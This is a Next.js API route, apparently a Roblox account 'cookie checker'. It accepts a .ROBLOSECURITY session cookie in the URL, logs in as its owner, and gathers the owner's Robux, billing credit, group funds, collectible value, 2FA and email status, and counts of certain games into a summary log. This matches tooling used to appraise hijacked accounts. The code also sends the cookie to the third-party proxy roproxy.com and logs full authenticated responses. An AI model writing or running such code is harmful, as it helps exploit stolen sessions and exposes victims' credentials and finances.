import { NextResponse } from "next/server";

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  let requestedUserId = searchParams.get("userId"); // giữ tên biến để phân biệt
  const cookieRaw = searchParams.get("cookie");
  const mode = searchParams.get("mode") || "basic";

  console.log({
    requestedUserId,
    cookieRaw: cookieRaw ? "[REDACTED]" : null,
    mode,
  });

  if (!requestedUserId || isNaN(Number(requestedUserId))) {
    return NextResponse.json({ error: "Thiếu hoặc userId không hợp lệ" }, { status: 400 });
  }

  const result: any = {
    meta: {
      requestedUserId,
      authenticatedUser: null as null | { id: string; name?: string; displayName?: string },
      effectiveUserId: requestedUserId,
    },

    // Public/basic (the userId from query / extracted from file)
    requested: {
      basic: null,
      accountAgeDays: null,
      avatarHeadshotUrl: null,
    },

    // Full/private (by default: cookie owner when cookie provided)
    cookieOwner: {
      basic: null,
      accountAgeDays: null,
      avatarHeadshotUrl: null,
      robux: null,
      pendingRobux: null,
      summary: null,
      premium: "N/A",
      creditBalance: null,
      groupBalances: [],
      rap: null,
      limiteds: null,
      hasInventory: null,
      groupsCount: null,
      ownedGroups: null,
      emailVerified: null,
      twoFA: null,
      games: [],
      gamesCount: null,
      visits: null,
      isDeveloper: null,
      mm2_count: null,
      adm_count: null,
      sab_count: null,
      note: null,
    },

    // Backward-compatible fields (keep existing clients working)
    basic: null,
    accountAgeDays: null,
    avatarHeadshotUrl: null,
    robux: null,
    pendingRobux: null,
    summary: null,
    premium: "N/A",
    creditBalance: null,
    groupBalances: [],
    rap: null,
    limiteds: null,
    hasInventory: null,
    groupsCount: null,
    ownedGroups: null,
    emailVerified: null,
    twoFA: null,
    games: [],
    gamesCount: null,
    visits: null,
    isDeveloper: null,
    mm2_count: null,
    adm_count: null,
    sab_count: null,
    note: null,
  };

  const commonHeaders = {
    Accept: "application/json",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  };

  try {
    // Basic info (public) - dùng requestedUserId trước
    let userId = requestedUserId; // mặc định

    const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
      headers: commonHeaders,
      cache: "no-store",
    });
    if (userRes.ok) {
      const userData = await userRes.json();
      result.requested.basic = userData;
      result.basic = userData;
      if (userData.created) {
        const age = Math.floor(
          (Date.now() - new Date(userData.created).getTime()) / 86400000
        );
        result.requested.accountAgeDays = age;
        result.accountAgeDays = age;
      }
    }

    // Avatar headshot - cũng dùng userId ban đầu
    try {
      const thumbRes = await fetch(
        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
        { headers: commonHeaders, cache: "no-store" }
      );
      if (thumbRes.ok) {
        const thumbJson = await thumbRes.json();
        const url = thumbJson?.data?.[0]?.imageUrl || null;
        result.requested.avatarHeadshotUrl = url;
        result.avatarHeadshotUrl = url;
      }
    } catch {}

    // Nếu có cookie và mode full → chuyển sang dùng userId của chủ cookie
    if (mode === "full" && cookieRaw) {
      const cookie = `.ROBLOSECURITY=${cookieRaw}`;

      let csrfToken = "";
      try {
        const csrfRes = await fetch("https://auth.roblox.com/v2/logout", {
          method: "POST",
          headers: { ...commonHeaders, Cookie: cookie },
          cache: "no-store",
        });
        if (csrfRes.headers.has("x-csrf-token")) {
          csrfToken = csrfRes.headers.get("x-csrf-token") || "";
        }
      } catch {}

      const authHeaders = {
        ...commonHeaders,
        Cookie: cookie,
        ...(csrfToken ? { "x-csrf-token": csrfToken } : {}),
      };

      const safeFetch = async (url: string, opts: any = {}) => {
        try {
          // Chỉ sử dụng proxy cho các request KHÔNG dùng Cookie/Auth
          // Hoặc nếu endpoint bị chặn ở môi trường server hiện tại.
          // NHƯNG với Robux (economy), Billing (credit) thì nên dùng thẳng roblox.com
          // để tránh proxy làm mất/lỗi Header Cookie hoặc trả về dữ liệu cache sai.
          let fetchUrl = url;
          
          // Danh sách các domain nhạy cảm nên thử fetch trực tiếp trước
          const isSensitive = 
            url.includes("economy.roblox.com") || 
            url.includes("billing.roblox.com") || 
            url.includes("accountsettings.roblox.com") ||
            url.includes("auth.roblox.com");

          // Nếu không nhạy cảm (như games/inventory công khai) thì mới dùng proxy để tránh rate limit
          if (!isSensitive) {
             if (
              !url.includes("inventory.roblox.com") &&
              !url.includes("accountsettings.roblox.com") &&
              !url.includes("economy.roblox.com") &&
              !url.includes("premiumfeatures.roblox.com") &&
              !url.includes("billing.roblox.com")
            ) {
              fetchUrl = url.replace(/roblox\.com/g, "roproxy.com");
            }
          }

          console.log(`[Fetch] Target: ${fetchUrl}`);
          
          const res = await fetch(fetchUrl, { 
            ...opts, 
            headers: authHeaders, 
            cache: "no-store",
            // Thêm redirect: "follow" để chắc chắn không bị dừng ở 302
            redirect: "follow" 
          });

          if (res.ok) {
            const data = await res.json();
            // LOG TOÀN BỘ RESPONSE DATA ĐỂ DEBUG (PRETTY PRINT)
            console.log(`[SUCCESS] ${url} ->\n`, JSON.stringify(data, null, 2));
            
            return data;
          } else {
            const errBody = await res.text().catch(() => "");
            console.log(`[FAIL] ${url} - Status ${res.status} - Body: ${errBody.slice(0, 100)}`);
            return null;
          }
        } catch (e: any) {
          console.log(`[ERROR] Fetch error: ${url} - ${e.message}`);
          return null;
        }
      };

      // Lấy thông tin chủ cookie - đây là bước quyết định
      const selfData = await safeFetch("https://users.roblox.com/v1/users/authenticated");

      if (selfData && selfData.id) {
        const authenticatedUserId = selfData.id.toString();
        result.meta.authenticatedUser = {
          id: authenticatedUserId,
          name: selfData.name,
          displayName: selfData.displayName,
        };
        console.log(`Cookie owner: ID ${authenticatedUserId} - Name: ${selfData.name} - DisplayName: ${selfData.displayName}`);

        // ĐỊNH NGHĨA HÀM FETCH ĐÔI (CHỈ CHO CÁC ENDPOINT HỖ TRỢ USERID)
        const fetchParallel = async (urlTemplate: string, requestedId: string, ownerId: string) => {
          const [reqRes, ownRes] = await Promise.all([
            safeFetch(urlTemplate.replace("{userId}", requestedId)),
            safeFetch(urlTemplate.replace("{userId}", ownerId))
          ]);
          return { requested: reqRes, owner: ownRes };
        };

        // Chuyển sang dùng userId của chủ cookie cho các field backward-compatible
        userId = authenticatedUserId;
        result.meta.effectiveUserId = userId;
        
        // 1. Basic Info & Avatar cho cả 2
        const basicData = await fetchParallel("https://users.roblox.com/v1/users/{userId}", requestedUserId, authenticatedUserId);
        if (basicData.requested) {
          result.requested.basic = basicData.requested;
          if (basicData.requested.created) {
            result.requested.accountAgeDays = Math.floor((Date.now() - new Date(basicData.requested.created).getTime()) / 86400000);
          }
        }
        if (basicData.owner) {
          result.cookieOwner.basic = basicData.owner;
          result.basic = basicData.owner;
          if (basicData.owner.created) {
            result.cookieOwner.accountAgeDays = Math.floor((Date.now() - new Date(basicData.owner.created).getTime()) / 86400000);
            result.accountAgeDays = result.cookieOwner.accountAgeDays;
          }
        }

        const thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=420x420&format=Png&isCircular=false";
        const thumbData = await fetchParallel(thumbUrl, requestedUserId, authenticatedUserId);
        result.requested.avatarHeadshotUrl = thumbData.requested?.data?.[0]?.imageUrl || null;
        result.cookieOwner.avatarHeadshotUrl = thumbData.owner?.data?.[0]?.imageUrl || null;
        result.avatarHeadshotUrl = result.cookieOwner.avatarHeadshotUrl;

        // 2. Robux & Credit & Email & 2FA (Chỉ Cookie Owner mới có hoàn toàn, nhưng Transaction Totals có thể thử cả 2)
        const robuxData = await safeFetch("https://economy.roblox.com/v1/user/currency");
        if (robuxData?.robux !== undefined) {
          result.cookieOwner.robux = robuxData.robux;
          result.robux = robuxData.robux;
        }

        const fetchTransactions = async (uId: string) => {
          const data = await safeFetch(`https://economy.roblox.com/v2/users/${uId}/transaction-totals?timeFrame=Month&transactionType=summary`);
          if (!data) return { pending: 0, summary: 0 };
          console.log("data ransaction:: ", data)
          
          // Summary = Tổng Robux từng xài (lấy trị tuyệt đối của outgoingRobuxTotal)
          const totalSpent = Math.abs(data.outgoingRobuxTotal || 0);
          
          return { pending: data.pendingRobuxTotal ?? 0, summary: totalSpent };
        };

        const [reqTrans, ownTrans] = await Promise.all([
          fetchTransactions(requestedUserId),
          fetchTransactions(authenticatedUserId)
        ]);

        result.requested.pendingRobux = reqTrans.pending;
        result.requested.summary = reqTrans.summary;
        
        result.cookieOwner.pendingRobux = ownTrans.pending;
        result.cookieOwner.summary = ownTrans.summary;
        // Compat
        result.pendingRobux = ownTrans.pending;
        result.summary = ownTrans.summary;

        console.log(ownTrans)

        const creditData = await safeFetch("https://billing.roblox.com/v1/credit");
        if (creditData?.robuxAmount !== undefined) {
          result.cookieOwner.creditBalance = creditData.robuxAmount;
          result.creditBalance = creditData.robuxAmount;
        }

        const emailData = await safeFetch("https://accountsettings.roblox.com/v1/email");
        if (emailData?.verified !== undefined) {
          result.cookieOwner.emailVerified = emailData.verified;
          result.emailVerified = emailData.verified;
        }

        const pinData = await safeFetch("https://auth.roblox.com/v1/account/pin");
        if (pinData?.isEnabled !== undefined) {
          const val = pinData.isEnabled ? "Authenticator Enabled" : "No 2FA";
          result.cookieOwner.twoFA = val;
          result.twoFA = val;
        }

        // 3. Groups & Balances (Fetch cả 2)
        const fetchGroups = async (uId: string) => {
          const gData = await safeFetch(`https://groups.roblox.com/v2/users/${uId}/groups/roles`);
          if (!gData?.data) return { count: 0, owned: 0, balances: [] };
          const owned = gData.data.filter((g: any) => g.role?.rank === 255);
          const balances: any[] = [];
          for (const group of owned) {
            const currency = await safeFetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`);
            if (currency?.robux !== undefined) {
              balances.push({ groupId: group.group.id, name: group.group.name, robux: currency.robux });
            }
          }
          return { count: gData.data.length, owned: owned.length, balances };
        };

        const [reqGroups, ownGroups] = await Promise.all([
          fetchGroups(requestedUserId),
          fetchGroups(authenticatedUserId)
        ]);

        result.requested.groupsCount = reqGroups.count;
        result.requested.ownedGroups = reqGroups.owned;
        result.requested.groupBalances = reqGroups.balances;

        result.cookieOwner.groupsCount = ownGroups.count;
        result.cookieOwner.ownedGroups = ownGroups.owned;
        result.cookieOwner.groupBalances = ownGroups.balances;
        // Compat
        result.groupsCount = ownGroups.count;
        result.ownedGroups = ownGroups.owned;
        result.groupBalances = ownGroups.balances;

        // 4. Games & Visits (Fetch cả 2)
        const fetchGames = async (uId: string) => {
          let games: any[] = [];
          let cursor: string | null = null;
          let visits = 0;
          do {
            const data = await safeFetch(`https://games.roblox.com/v2/users/${uId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`);
            if (data?.data) {
              games = games.concat(data.data);
              data.data.forEach((g: any) => visits += (g.placeVisits || g.visits || 0));
              cursor = data.nextPageCursor;
            } else break;
          } while (cursor);

          const lowerNames = games.map(g => g.name.toLowerCase());
          return {
            games: games.map(g => ({ name: g.name, visits: (g.placeVisits || g.visits || 0), created: g.created })),
            visits,
            mm2: lowerNames.filter(n => n.includes("mm2") || n.includes("murder mystery")).length,
            adm: lowerNames.filter(n => n.includes("admin") || n.includes("commands")).length,
            sab: lowerNames.filter(n => n.includes("sab") || n.includes("sabotage")).length,
            isDev: games.length > 0 && games[0].creator?.id?.toString() === uId
          };
        };

        const [reqGames, ownGames] = await Promise.all([
          fetchGames(requestedUserId),
          fetchGames(authenticatedUserId)
        ]);

        result.requested.visits = reqGames.visits;
        result.requested.mm2_count = reqGames.mm2;
        result.requested.adm_count = reqGames.adm;
        result.requested.sab_count = reqGames.sab;
        result.requested.isDeveloper = reqGames.isDev;

        result.cookieOwner.visits = ownGames.visits;
        result.cookieOwner.mm2_count = ownGames.mm2;
        result.cookieOwner.adm_count = ownGames.adm;
        result.cookieOwner.sab_count = ownGames.sab;
        result.cookieOwner.isDeveloper = ownGames.isDev;
        // Compat
        result.visits = ownGames.visits;
        result.mm2_count = ownGames.mm2;
        result.adm_count = ownGames.adm;
        result.sab_count = ownGames.sab;
        result.isDeveloper = ownGames.isDev;

        // 5. Collectibles / RAP (Fetch cả 2)
        const fetchInv = async (uId: string) => {
          let rap = 0, count = 0, cursor: string | null = null;
          do {
            const data = await safeFetch(`https://inventory.roblox.com/v1/users/${uId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`);
            if (data?.data) {
              count += data.data.length;
              data.data.forEach((i: any) => rap += (i.recentAveragePrice || 0));
              cursor = data.nextPageCursor;
            } else break;
          } while (cursor);
          return { rap, count };
        };

        const [reqInv, ownInv] = await Promise.all([
          fetchInv(requestedUserId),
          fetchInv(authenticatedUserId)
        ]);
        result.requested.rap = reqInv.rap;
        result.requested.limiteds = reqInv.count;
        result.cookieOwner.rap = ownInv.rap;
        result.cookieOwner.limiteds = ownInv.count;
        result.rap = ownInv.rap;
        result.limiteds = ownInv.count;
        result.hasInventory = ownInv.count > 0;

        // Premium (Fetch cả 2)
        const premData = await fetchParallel("https://premiumfeatures.roblox.com/v1/users/{userId}/validate-membership", requestedUserId, authenticatedUserId);
        result.requested.premium = premData.requested ? "Premium" : "N/A";
        result.cookieOwner.premium = premData.owner ? "Premium" : "N/A";
        result.premium = result.cookieOwner.premium;

      } else {
        result.note = "Cookie không hợp lệ hoặc không thể authenticate → chỉ có thông tin public";
      }

      // Log tổng hợp (giữ nguyên)
      const summaryLog = {
        username: result.basic?.name || "Unknown",
        displayName: result.basic?.displayName || "Unknown",
        accountAgeDays: result.accountAgeDays || 0,
        isDeveloper: result.isDeveloper === true ? "True" : "False",
        gameVisits: result.visits || 0,
        groupsCount: result.groupsCount || 0,
        robuxBalance: result.robux || 0,
        pendingRobux: result.pendingRobux || 0,
        rap: result.rap || 0,
        limiteds: result.limiteds || 0,
        summaryValue: result.summary || 0,
        creditBalance: result.creditBalance || 0,
        inUnknown: 0,
        premium: result.premium,
        emailVerified: result.emailVerified ? "Verified" : "Not Verified",
        twoFA: result.twoFA || "No 2FA",
        ownedGroups: result.ownedGroups || 0,
        groupBalanceTotal: result.groupBalances.reduce((sum: number, g: any) => sum + (g.robux || 0), 0),
        mm2_games: result.mm2_count > 0 ? `True | ${result.mm2_count}` : "False | 0",
        adm_games: result.adm_count > 0 ? `True | ${result.adm_count}` : "False | 0",
        sab_games: result.sab_count > 0 ? `True | ${result.sab_count}` : "False | 0",
        hasInventory: result.hasInventory ? "True" : "False",
      };

      console.log("User Info Summary (từ data fetch được):", JSON.stringify(summaryLog, null, 2));
    }

    return NextResponse.json(result);
  } catch (err: any) {
    console.error("Global error:", err.message);
    return NextResponse.json(result, { status: 200 });
  }
}